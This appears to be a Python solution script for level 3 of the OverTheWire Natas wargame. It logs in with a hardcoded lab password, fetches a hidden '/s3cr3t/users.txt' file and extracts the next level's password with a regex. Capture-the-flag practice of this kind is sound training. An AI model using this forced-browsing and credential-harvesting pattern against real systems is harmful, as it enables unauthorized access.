#!/usr/bin/env python3
import requests 
import re

username = "natas3"
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'

s = requests.session()

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

r = s.get(url, auth = (username, password))
content = r.text
# print(content)
print(re.findall('natas4:(.*)',content)[0])